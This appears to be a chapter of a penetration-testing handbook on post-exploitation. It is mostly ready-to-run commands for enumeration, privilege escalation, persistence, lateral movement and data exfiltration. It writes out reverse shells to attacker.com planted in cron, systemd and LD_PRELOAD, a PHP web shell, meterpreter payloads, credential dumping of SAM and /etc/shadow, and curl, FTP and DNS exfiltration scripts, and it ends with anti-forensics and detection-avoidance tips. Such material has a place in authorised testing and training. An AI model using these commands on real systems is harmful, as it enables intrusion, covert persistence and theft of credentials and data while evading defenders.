# 3. Post-Exploitation

## 3.1 System Enumeration

### Linux System Enumeration

**Basic System Information:**
```bash
# System details
whoami
id
uname -a
hostname
cat /etc/issue
cat /etc/passwd | grep sh$

# Network configuration
ifconfig -a
ip addr show
ip route
arp -a
netstat -antup
ss -tulpn

# Running processes
ps aux
ps -ef
top
htop

# Installed packages
dpkg -l
rpm -qa
pacman -Q
```

**User Information:**
```bash
# All users
cat /etc/passwd
cut -d: -f1 /etc/passwd

# Users with shell
grep 'sh$' /etc/passwd

# Sudo configuration
sudo -l
cat /etc/sudoers

# Currently logged users
w
last
lastlog

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
cat /etc/ssh/sshd_config
```

**File System Enumeration:**
```bash
# Interesting files
find / -type f -name "*.conf" 2>/dev/null
find / -type f -name "config*" 2>/dev/null
find / -type f -name "*.php" 2>/dev/null
find / -type f -name "*.bak" 2>/dev/null
find / -type f -name "*backup*" 2>/dev/null

# Password files
find / -name "*password*" 2>/dev/null
find / -name "*.pwd" 2>/dev/null

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null
find / -perm -002 -type f 2>/dev/null

# Check /tmp and /var/tmp
ls -la /tmp/
ls -la /var/tmp/
```

**Cron Job Enumeration:**
```bash
# System crontab
cat /etc/crontab

# User crontabs
cat /etc/cron.d/*
ls -la /etc/cron.*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.monthly/*
cat /etc/cron.weekly/*

# Individual user crontabs
crontab -l
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done
```

**Application Enumeration:**
```bash
# Web servers
ps aux | grep -E "(apache|nginx|httpd)"
ls -la /var/www/
ls -la /etc/apache2/
ls -la /etc/nginx/

# Databases
ps aux | grep -E "(mysql|mssql|oracle|postgres)"
ls -la /etc/mysql/
ls -la /var/lib/mysql/

# Running services
systemctl list-units --type=service --state=running
service --status-all
```

### Windows System Enumeration

**System Information:**
```powershell
# System details
systeminfo
hostname
whoami
whoami /priv
whoami /groups

# Environment variables
set
Get-ChildItem Env:

# Network configuration
ipconfig /all
netstat -anob
arp -a
route print

# Running processes
tasklist /v
Get-Process

# Services
sc query
net start
Get-Service
```

**User Information:**
```powershell
# All users
net user
Get-LocalUser

# User groups
net localgroup
Get-LocalGroup

# Administrators
net localgroup Administrators
Get-LocalGroupMember Administrators

# Currently logged users
query user
qwinsta

# User privileges
whoami /priv
```

**File System Enumeration:**
```powershell
# System drive
dir C:\
dir C:\Windows
dir C:\Windows\System32

# Interesting locations
dir C:\Users
dir "C:\Program Files"
dir "C:\Program Files (x86)"

# Search for passwords
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.ini,*.config -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Include *password* -ErrorAction SilentlyContinue

# Recent files
dir C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent

# Recycle Bin
dir C:\$Recycle.Bin
```

**Registry Enumeration:**
```powershell
# Check for stored passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"

# Auto-start programs
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

# SAM database
reg save hklm\sam C:\temp\sam.save
reg save hklm\system C:\temp\system.save
reg save hklm\security C:\temp\security.save
```

**Application Enumeration:**
```powershell
# Installed software
wmic product get name,version
Get-WmiObject -Class Win32_Product

# Web servers
dir C:\inetpub
sc query w3svc

# Database services
sc query MSSQLSERVER
sc query MySQL
```

## 3.2 Privilege Escalation

### Linux Privilege Escalation

**Kernel Exploits:**
```bash
# Check kernel version
uname -a

# Search exploits
searchsploit linux kernel 4.15
searchsploit ubuntu 18.04 privilege escalation

# Dirty COW (CVE-2016-5195)
git clone https://github.com/dirtycow/dirtycow.github.io.git
cd dirtycow.github.io
make
./dirty0x3

# Kernel 4.4.0 (Ubuntu 16.04)
wget https://www.exploit-db.com/download/44298
gcc 44298.c -o exploit
./exploit
```

**SUID Binary Exploits:**
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Nmap older versions
nmap --interactive
!sh

# Vim
vim -c ':!/bin/sh'

# Find
find /etc/passwd -exec /bin/sh \;

# Awk
awk 'BEGIN {system("/bin/sh")}'

# Less/More
less /etc/passwd
!/bin/sh
```

**Cron Job Privilege Escalation:**
```bash
# View cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# If cron job runs script as root
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f" > script.sh
chmod +x script.sh
# Wait for cron to execute

# Editable cron files
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" >> /etc/crontab
```

**PATH Variable Manipulation:**
```bash
# Check PATH
echo $PATH

# Create malicious script
echo '/bin/sh' > ps
chmod 777 ps

# Add current directory to PATH
export PATH=.:$PATH

# Run script that calls ps
./run_script.sh
```

**Wildcard Exploits:**
```bash
# Find wildcard scripts
find / -name "*.sh" -exec grep -l " \* " {} \;

# Create malicious files
touch -- "-rf /*"
touch -- "--help"
echo 'chmod 777 /etc/shadow' > "-e\ncode.sh"

# When script runs: script *
```

**NFS Privilege Escalation:**
```bash
# Check for no_root_squash
cat /etc/exports

# If no_root_squash
# On attacker:
mkdir /tmp/nfs
mount -t nfs target:/shared /tmp/nfs
cd /tmp/nfs
cp /bin/bash .
chmod +s bash
./bash -p
```

**Docker Privilege Escalation:**
```bash
# Check if in Docker
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Docker socket mounted
ls -la /var/run/docker.sock

# If accessible:
docker run -v /:/host --privileged -it chroot /host /bin/bash

# Docker escape with capabilities
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -i -n sh
```

### Windows Privilege Escalation

**Unquoted Service Path:**
```cmd
# Find services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# If service path has spaces and not quoted
# Create malicious executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > service.exe

# Place in path before space
copy service.exe "C:\Program Files\Vulnerable Service\service.exe"

# Restart service
sc stop "Service Name"
sc start "Service Name"
```

**Weak Service Permissions:**
```cmd
# Check service permissions
accesschk.exe -ucqv "Service Name"

# If changeable:
sc config "Service Name" binpath= "C:\temp\reverse.exe"
sc start "Service Name"
```

**AlwaysInstallElevated:**
```cmd
# Check registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

# If both 1:
# Create malicious MSI
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f msi > install.msi

# Execute
msiexec /quiet /qn /i install.msi
```

**Stored Credentials:**
```cmd
# SAM/LSA secrets
# Dump hashes
reg save hklm\sam c:\temp\sam.save
reg save hklm\system c:\temp\system.save
reg save hklm\security c:\temp\security.save

# Use secretsdump.py
python secretsdump.py -system system.save -sam sam.save -security security.save LOCAL

# Unattend files
dir C:\Windows\Panther\Unattend.xml
dir C:\Windows\Panther\Unattended.xml
dir C:\Windows\System32\Sysprep\Unattend.xml

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

**DLL Hijacking:**
```cmd
# Find missing DLLs with Process Monitor
# Create malicious DLL with DllMain

// dllmain.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe");
    }
    return TRUE;
}

// Compile
x86_64-w64-mingw32-gcc -shared -o malicious.dll dllmain.c

# Place in application directory
copy malicious.dll "C:\Program Files\Application\missing.dll"
```

**Token Impersonation:**
```powershell
# With meterpreter or mimikatz
# Get system token
incognito.exe list_tokens -u
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe

# Rotten Potato (abusing token impersonation)
# Compile and run
RottenPotato.exe
# Then impersonate SYSTEM token
```

## 3.3 Persistence

### Linux Persistence Mechanisms

**Cron Job Persistence:**
```bash
# Add persistent reverse shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -

# Alternative cron locations
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" >> /etc/crontab

# @reboot persistence
echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -
```

**SSH Key Persistence:**
```bash
# Generate SSH key pair on attacker
ssh-keygen -t rsa

# Add public key to authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# For root
sudo mkdir -p /root/.ssh
sudo echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
sudo chmod 700 /root/.ssh
sudo chmod 600 /root/.ssh/authorized_keys
```

**Systemd Service Persistence:**
```bash
# Create systemd service
sudo cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
sudo systemctl enable backdoor.service
sudo systemctl start backdoor.service
```

**LD_PRELOAD Persistence:**
```bash
# Create malicious shared library
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    FILE *fp;
    fp=fopen("/tmp/.pwned","a");
    fprintf(fp,"[+] Backdoor triggered by PID %d\n",getpid());
    fclose(fp);
    setuid(0);
    setgid(0);
    system("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'");
}
EOF

# Compile
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# Add to profile
echo "export LD_PRELOAD=/tmp/evil.so" >> /etc/bashrc
```

**Web Shell Persistence:**
```bash
# Create web shell in web directory
cat > /var/www/html/cmd.php << EOF
<?php
system($_GET['cmd']);
?>
EOF

# Alternative web shell with password
cat > /var/www/html/up.php << EOF
<?php
if(isset($_POST['pass']) && $_POST['pass'] == 'password') {
    if(isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    }
}
?>
<form method="post" enctype="multipart/form-data">
<input type="password" name="pass">
<input type="file" name="file">
<input type="submit">
</form>
EOF
```

### Windows Persistence Mechanisms

**Registry Persistence:**
```cmd
# Run key persistence
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\update.exe"

# RunOnce persistence
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "C:\temp\setup.exe"

# User persistence
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Skype" /t REG_SZ /d "C:\temp\skype.exe"

# Active Setup
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\{Unique-ID}" /v "StubPath" /t REG_SZ /d "C:\temp\persist.exe"
```

**Scheduled Task Persistence:**
```cmd
# Create scheduled task
schtasks /create /tn "Windows Security" /tr "C:\Windows\System32\cmd.exe /c powershell -enc <base64_payload>" /sc onlogon

# Hidden task
schtasks /create /tn "GoogleUpdate" /tr "C:\temp\update.exe" /sc daily /st 09:00 /ru System

# Event-based persistence
schtasks /create /tn "Maintenance" /tr "C:\temp\maint.exe" /sc onevent /EC Application /MO *[System/EventID=1024]
```

**Service Persistence:**
```cmd
# Create new service
sc create "DriverUpdate" binpath= "C:\temp\driver.exe" start= auto
sc description "DriverUpdate" "Update service for drivers"

# Modify existing service
sc config "ExistingService" start= auto
sc config "ExistingService" binpath= "C:\temp\malicious.exe"

# Recovery actions
sc failure "DriverUpdate" reset= 86400 command= "C:\temp\recover.exe" actions= restart/5000/restart/10000
```

**WMI Persistence:**
```powershell
# WMI event consumer
$Filter = Set-WmiEventConsumer -Name "CommandLineEventConsumer" -CommandLineTemplate "C:\temp\wmi.exe"
Set-WmiEventFilter -Name "WindowsUpdate" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" -EventNamespace root\cimv2
Set-WmiEventFilterToConsumerBinding -Filter $Filter -Consumer $Filter

# Permanent WMI event
Set-WmiInstance -Class __EventConsumer -Arguments @{Name="PermanentConsumer"; CommandLineTemplate="C:\temp\permanent.exe"}
```

**DLL Persistence:**
```cmd
# AppInit_DLLs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /t REG_SZ /d "C:\temp\evil.dll"

# Print monitor persistence
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors\MyMonitor" /v "Driver" /t REG_SZ /d "C:\temp\evil.dll"

```

**Office Persistence:**
```vba
' VBA macro for persistence
Sub Auto_Open()
    Shell "cmd.exe /c powershell -enc <base64_payload>", vbHide
End Sub

Sub Document_Open()
    Auto_Open
End Sub

' AutoExec macro in Normal.dotm for Word
' This Document_Close in Normal.dotm for persistence
```

## 3.4 Lateral Movement

### SSH Lateral Movement

**Pass the Hash with SSH:**
```bash
# If hashes cracked to password
ssh target@192.168.1.10

# SSH agent forwarding
ssh -A root@initial_target
ssh target@192.168.1.10

# SSH tunneling
ssh -L 8080:192.168.1.10:80 root@initial_target
ssh -R 8080:localhost:80 root@initial_target
```

**SSH Key Reuse:**
```bash
# Test found SSH key on multiple hosts
for ip in $(cat hosts.txt); do
    ssh -i id_rsa root@$ip "whoami" & done
    done

# SSH key distribution
ssh-copy-id -i id_rsa user@target
```

### SMB/WMI Lateral Movement

**Pass the Hash:**
```bash
# Using pth-winexe
pth-winexe -U user%hash //192.168.1.10 cmd

# Using crackmapexec
crackmapexec smb 192.168.1.10 -u user -H hash -x whoami

# Using smbmap
smbmap -H 192.168.1.10 -u user -p hash
```

**WMI Commands:**
```bash
# WMIExec (impacket)
python wmiexec.py user:password@192.168.1.10
python wmiexec.py -hashes :hash user@192.168.1.10

# WMIC commands
wmic /user:user /password:password /node:192.168.1.10 process call create "cmd.exe /c whoami"
```

**PsExec:**
```bash
# PsExec from Sysinternals
psexec \\192.168.1.10 -u user -p password cmd

# PsExec from Metasploit
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser user
set SMBPass hash
set SMBDomain .
exploit
```

### RDP Lateral Movement

**RDP with Credentials:**
```bash
# xfreerdp
xfreerdp /u:user /p:password /v:192.168.1.10

# rdesktop
rdesktop -u user -p password 192.168.1.10

# Using cracked hashes
# Need to find RDP vulnerability or use Pass the Cache
```

### Pass the Ticket

**Kerberos Ticket Reuse:**
```bash
# Extract tickets with Mimikatz
mimikatz "privilege::debug" "sekurlsa::tickets /export"

# Use ticket on Linux
export KRB5CCNAME=/path/to/ticket.kirbi
python wmiexec.py -no-pass -k target.com@192.168.1.10

# Inject ticket on Windows
mimikatz "kerberos::ptt ticket.kirbi"
```

## 3.5 Data Exfiltration

### File Transfer Techniques

**HTTP/HTTPS Exfiltration:**
```bash
# Start HTTP server on attacker
python -m SimpleHTTPServer 80
python3 -m http.server 80

# Upload from target
curl -T file.txt http://attacker.com/

# Download to target
curl http://attacker.com/file.txt -o file.txt

# POST file
curl -X POST -F "file=@/etc/passwd" http://attacker.com/upload.php
```

**FTP Exfiltration:**
```bash
# From target to attacker
ftp attacker.com
put sensitive_file.txt

# Automated FTP transfer
lftp -u user,password -e "put /etc/shadow; quit" ftp.attacker.com
```

**SCP/SFTP Exfiltration:**
```bash
# SCP transfer
scp file.txt user@attacker.com:/path/

# Recursive transfer
scp -r /home/user/documents user@attacker.com:/path/

# SFTP
sftp user@attacker.com
put file.txt
```

**DNS Exfiltration:**
```bash
# Using DNS exfiltration
# Install dnscat2 server on attacker
ruby dnscat2.rb --dns "domain=attacker.com"

# On target, use dnscat2 client
./dnscat2 server=attacker.com

# DNS data encoding
# Base64 encode file data and send as DNS queries
for line in $(cat file.txt | base64 -w0); do
    nslookup $line.attacker.com
done
```

### Data Collection Scripts

**Linux Data Collection:**
```bash
# System info collection
#!/bin/bash
mkdir -p /tmp/exfil
id > /tmp/exfil/id.txt
uname -a > /tmp/exfil/uname.txt
ps aux > /tmp/exfil/processes.txt
netstat -antup > /tmp/exfil/netstat.txt
cat /etc/passwd > /tmp/exfil/passwd.txt
cat /etc/shadow > /tmp/exfil/shadow.txt
tar czf /tmp/exfil.tgz /tmp/exfil
curl -F "file=@/tmp/exfil.tgz" http://attacker.com/upload.php
```

**Windows Data Collection:**
```powershell
# PowerShell data collection
mkdir C:\temp\exfil
systeminfo > C:\temp\exfil\systeminfo.txt
tasklist /v > C:\temp\exfil\processes.txt
netstat -anob > C:\temp\exfil\netstat.txt
Get-LocalUser | Select Name,Enabled > C:\temp\exfil\users.txt
Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.doc,*.pdf | Select FullName | Out-File C:\temp\exfil\files.txt
Compress-Archive -Path C:\temp\exfil\* -DestinationPath C:\temp\exfil.zip
Invoke-RestMethod -Uri "http://attacker.com/upload" -Method POST -InFile "C:\temp\exfil.zip"
```

## Important Post-Exploitation Notes

1. **Stealth Considerations:**
   - Minimize log creation
   - Use legitimate system tools
   - Avoid noisy commands
   - Clean up after activities

2. **Anti-Forensics:**
   - Clear command history
   - Delete uploaded tools
   - Modify timestamps
   - Clean evidence files

3. **Logging and Documentation:**
   - Record all findings
   - Document privilege escalation paths
   - Save credentials and hashes
   - Create network maps

4. **Detection Avoidance:**
   - Monitor AV/EDR responses
   - Use encoded payloads
   - Implement time delays
   - Rotate between techniques